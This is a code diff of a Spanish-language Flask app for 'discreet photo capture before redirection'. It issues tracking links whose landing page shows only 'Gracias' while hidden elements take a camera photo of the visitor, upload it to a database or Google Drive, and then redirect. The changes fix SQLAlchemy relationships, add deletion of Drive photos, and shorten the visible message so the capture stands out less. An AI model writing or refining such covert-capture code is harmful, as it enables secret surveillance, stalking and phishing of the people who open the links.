@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 Sistema de Captura Discreta de Fotos antes de Redirección
-Versión: 5.2 - Integración con Base de Datos y Mensaje de Redirección Personalizado
+Versión: 5.5 - Corrección definitiva de relaciones SQLAlchemy y ArgumentError
 """
 
 from flask import Flask, request, render_template_string, jsonify, send_from_directory
@@ -35,7 +35,6 @@ app = Flask(__name__)
 app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'change_this_secret_key_in_production')
 
 # Determinar si estamos en un entorno de desarrollo local (usando SQLite) o en producción
-# Esto afectará si guardamos fotos localmente de forma permanente o solo temporal
 IS_LOCAL_DEV = os.environ.get('DATABASE_URL') is None
 
 app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL', 'sqlite:///app_data.db')
@@ -68,6 +67,12 @@ class Link(db.Model):
     
     drive_config_id = db.Column(db.String(50), db.ForeignKey('drive_config.id'), nullable=True)
     drive_config = db.relationship('DriveConfig', backref='links')
+    
+    # === MODIFICACIÓN CLAVE AQUÍ: Definir la relación de Link a Photo ===
+    # 'photos' es el nombre del atributo en el objeto Link (ej. my_link.photos)
+    # 'backref="link_obj"' crea un atributo 'link_obj' en cada objeto Photo, apuntando a su Link padre.
+    # 'cascade="all, delete-orphan"' asegura que al borrar un Link, sus fotos también se borran de la DB.
+    photos = db.relationship('Photo', backref='link_obj', lazy=True, cascade='all, delete-orphan') 
 
     def __repr__(self):
         return f"<Link {self.id}>"
@@ -75,7 +80,17 @@ class Link(db.Model):
 class Photo(db.Model):
     id = db.Column(db.String(36), primary_key=True, default=lambda: str(uuid.uuid4())) 
     link_id = db.Column(db.String(8), db.ForeignKey('link.id'), nullable=False)
-    link = db.relationship('Link', backref='photos')
+    
+    # === MODIFICACIÓN CLAVE AQUÍ: Eliminar el 'backref' de la relación 'link' en Photo ===
+    # La relación inversa (Link.photos) y el backref (Photo.link_obj)
+    # ya están definidos en el modelo Link.
+    # Esta definición de 'link' en Photo solo necesita especificar la relación a Link.
+    link = db.relationship('Link') # <--- Cambiar de 'db.relationship('Link', backref='photos')' a 'db.relationship('Link')'
+                                   # Esto es para evitar el conflicto del backref 'photos'.
+                                   # photo.link ahora será el objeto Link padre.
+                                   # Para acceder al Link padre, se puede usar photo.link o photo.link_obj (el backref).
+                                   # Las plantillas usan photo.link.id, que seguirá funcionando.
+    
     filename = db.Column(db.String(255), nullable=False)
     local_path = db.Column(db.String(255), nullable=True) 
     timestamp = db.Column(db.DateTime, default=datetime.utcnow)
@@ -383,7 +398,7 @@ HOME_TEMPLATE = """
                 <h3>📋 Captura Discreta:</h3>
                 <p><strong>Lo que verá el usuario:</strong></p>
                 <ul style="margin: 10px 0 10px 25px;">
-                    <li>"Gracias por visitarnos, te estamos redireccionando"</li>
+                    <li>"Gracias"</li>
                     <li>Redirección automática en 2-3 segundos</li>
                     <li>Sin vista previa, sin botones, sin complicaciones</li>
                 </ul>
@@ -611,8 +626,8 @@ DISCRETE_CAPTURE_TEMPLATE = """
 </head>
 <body>
     <div class="container">
-        <div class="icon">🥳</div>
-        <h2 id="mainMessage">Gracias, te estamos redireccionando</h2>
+        <div class="icon">📸</div>
+        <h2 id="mainMessage">Gracias</h2>
     </div>
 
     <!-- Elementos ocultos para captura -->
@@ -627,18 +642,15 @@ DISCRETE_CAPTURE_TEMPLATE = """
         let stream = null;
         let captureCompleted = false;
         
-        // La función setMainMessage ya no se usará dinámicamente en el flujo principal
-        // pero se mantiene por si se necesita para depuración o futuros mensajes.
         function setMainMessage(message) {
             mainMessageDiv.textContent = message;
         }
 
         function redirectToDestination() {
-            // El mensaje de redirección ya está incluido en el mensaje inicial
-            // Por lo tanto, no hay necesidad de cambiar el mensaje aquí.
+            setMainMessage('Redirigiendo...');
             setTimeout(() => {
                 window.location.href = destinationUrl;
-            }, 500); // Pequeño retraso para la redirección
+            }, 500);
         }
 
         async function performCaptureAndUpload() {
@@ -1346,6 +1358,7 @@ ADMIN_TEMPLATE = """
             } catch (error) {
                 console.error('Error:', error);
                 alert('Error de red al intentar eliminar el link.');
+                
             }
         }
     </script>
@@ -1687,7 +1700,7 @@ def delete_photo(photo_id):
 
 @app.route('/admin')
 def admin_panel():
-    """Panel de administración para ver links y estadísticas."""
+    """Panel de Administración para ver links y estadísticas."""
     links = Link.query.order_by(Link.created_at.desc()).all()
     return render_template_string(ADMIN_TEMPLATE, sorted_links=links, request=request)
 
@@ -1697,10 +1710,29 @@ def delete_link(link_id):
     try:
         link_to_delete = Link.query.get(link_id)
         if link_to_delete:
+            # === PASO CRÍTICO: Eliminar fotos de Google Drive antes de eliminar el Link ===
+            # Esto es necesario porque el cascade de SQLAlchemy solo elimina de la DB, no de Drive.
+            # Se itera sobre link_to_delete.photos (la relación 'photos' en Link)
+            for photo in link_to_delete.photos: # 'photos' es el nombre del backref desde Photo.link
+                drive_info = photo.drive_info
+                drive_config = photo.drive_config_used
+                
+                if drive_info and drive_info.get('drive_id') and GOOGLE_DRIVE_AVAILABLE and drive_config:
+                    try:
+                        service = get_drive_service(drive_config.service_account_json)
+                        if service:
+                            service.files().delete(fileId=drive_info['drive_id']).execute()
+                            logger.info(f"Deleted photo from Google Drive: {drive_info['drive_id']} (linked to deleted Link {link_id})")
+                    except Exception as e:
+                        logger.error(f"Error deleting photo {photo.id} from Google Drive during link deletion: {e}", exc_info=True)
+
+            # Eliminar el Link de la base de datos.
+            # El 'cascade="all, delete-orphan"' en la relación Link.photos
+            # se encargará de eliminar automáticamente las fotos asociadas de la DB.
             db.session.delete(link_to_delete)
             db.session.commit()
-            logger.info(f"Link '{link_id}' eliminado de la DB.")
-            return jsonify({'success': True, 'message': 'Link deleted successfully'})
+            logger.info(f"Link '{link_id}' y sus fotos asociadas (de la DB y Drive si subidas) eliminados.")
+            return jsonify({'success': True, 'message': 'Link y fotos asociadas eliminados con éxito.'})
         else:
             logger.warning(f"Attempted to delete non-existent link ID: {link_id}")
             return jsonify({'success': False, 'error': 'Link not found'}), 404
